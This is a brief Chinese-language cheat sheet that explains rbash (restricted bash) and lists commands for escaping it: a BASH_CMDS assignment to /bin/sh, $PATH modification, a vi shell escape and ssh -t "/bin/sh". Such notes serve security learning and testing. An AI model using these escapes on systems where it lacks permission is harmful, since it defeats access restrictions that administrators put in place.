# 关于受限终端

## 介绍

-rbash

是指restricted bash

它是bash的一个受限版本，通常用于限制用户的操作权限

通过启用受限模式，可用对用户进行某些限制

常用于创建受限用户（如FTP，WEB用户）

用于限制用户的操作权限，防止系统被破坏

如：

- 禁止执行cd命令改变工作目录。

- 禁止运行任何命令（除指定的命令）

- 禁止修改环境变量，如$PATH



## 绕过方式

- 利用BASH_CMDS绕过

```
BASH_CMDS[a]=/bin/sh;a

export PATH=$PATH:/bin
```

- 修改$PATH环境变量

```
export PATH=$PATH:/bin
```

将/bin或/usr/bin添加到$PATH

（或者在本地echo $PATH，然后将路径复制过来）

- 利用编辑器绕过

```
vi
:!/bin/sh
```

- 利用SSH绕过

```
ssh user@target -t "/bin/sh"
```

连接时指定shell，获取未受限的Shell
